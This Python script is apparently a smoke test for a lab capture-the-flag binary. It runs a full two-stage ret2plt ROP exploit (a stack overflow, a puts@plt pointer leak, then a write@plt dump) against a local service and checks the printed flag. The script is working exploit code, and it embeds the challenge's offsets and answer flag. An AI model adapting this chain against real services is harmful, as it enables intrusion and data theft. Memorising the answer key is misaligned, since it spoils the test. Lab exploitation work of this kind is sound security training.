#!/usr/bin/env python3
"""Smoke test for ret2plt-002 (port 9990): ret2plt with full ASLR,
PIE ON, full RELRO (-Wl,-z,now). NO libc addresses anywhere: both
stages ride the binary's own PLT.

Round 1 (the leak): pop rdi aims puts@plt at the .bss slot holding
the heap pointer (flag_ptr). puts prints the raw pointer bytes (6
bytes, then the NUL stops it) and the chain returns into main - the
service restarts (the banner re-prints, the loop re-arms).

Round 2 (the dump): pop rdi/rsi/rdx aim write@plt at the leaked heap
buffer - the flag bytes ride out raw. The chain returns into main.

Offsets (measured in the lab container, PIE-relative; the banner's
main() leak derives the base):
  puts@plt   +0x1030
  write@plt  +0x1040  (the write@plt the service itself rides once)
  flag_ptr   +0x4020  (.bss slot holding the heap pointer)
  vuln_copy ret slot: small[8] + saved rbp = 16 bytes of padding.

main() NULs the last read byte (input[n - 1] = 0): round 1's chain
ends with main's address (top byte 0x00, nothing lost).

Success output (round 2's raw write carries the flag line):

  FLAG{mr5_ret2plt_aslr_write}
"""

import re
import socket
import struct

HOST = "127.0.0.1"
PORT = 9990

PAD = 16

OFF_PUTS_PLT = 0x1030
OFF_WRITE_PLT = 0x1040
OFF_FLAG_PTR = 0x4020

p64 = lambda x: struct.pack("<Q", x & (2**64 - 1))


def recv_until(s, needle, limit=65536):
    data = b""
    while needle not in data and len(data) < limit:
        chunk = s.recv(4096)
        if not chunk:
            break
        data += chunk
    return data


def main():
    s = socket.create_connection((HOST, PORT), timeout=10)

    # the banner: the PIE anchors (main + the two gadgets)
    banner = recv_until(s, b"name? ")
    m = re.search(
        rb"main\(\) at 0x([0-9a-f]+) rdi\(\) at 0x([0-9a-f]+) "
        rb"rsi\(\) at 0x([0-9a-f]+)",
        banner,
    )
    assert m, f"no PIE anchors in banner: {banner[:120]!r}"
    main_addr, g_rdi, g_rsi_rdx = (int(m.group(i), 16) for i in range(1, 4))
    base = main_addr - 0x1229  # main's file offset (measured offline)
    print(f"[+] main={main_addr:#x} base={base:#x}")
    puts_plt = base + OFF_PUTS_PLT
    write_plt = base + OFF_WRITE_PLT
    flag_ptr = base + OFF_FLAG_PTR

    # round 1: puts(&flag_ptr) leaks the heap pointer, return to main
    # (each gadget aims past the 4-byte push rbp; mov rsp,rbp prologue)
    leak = b"A" * PAD + p64(g_rdi + 4) + p64(flag_ptr) + p64(puts_plt) + p64(main_addr)
    s.send(leak)
    data = recv_until(s, b"name? ", limit=8192)
    # the raw pointer bytes ride out right before the restarted banner
    m2 = re.search(rb"ret2plt-002 target", data)
    assert m2, f"no restarted banner: {data[:120]!r}"
    raw = data[: m2.start()].rstrip(b"\n")
    heap = int.from_bytes(raw[-6:], "little")
    print(f"[+] leaked heap pointer {heap:#x}")

    # round 2: write(1, heap, 0x100) dumps the flag buffer, return to main
    dump = (
        b"B" * PAD
        + p64(g_rdi + 4)
        + p64(1)
        + p64(g_rsi_rdx + 4)
        + p64(heap)
        + p64(0x100)
        + p64(write_plt)
        + p64(main_addr)
    )
    s.send(dump)
    out = recv_until(s, b"FLAG{", limit=8192)
    out += s.recv(4096)
    print(f"[+] output tail: {out[-80:]!r}")
    assert b"FLAG{mr5_ret2plt_aslr_write}" in out, "oracle flag missing"
    print("[+] ret2plt-002 SMOKE TEST PASSED")


if __name__ == "__main__":
    main()
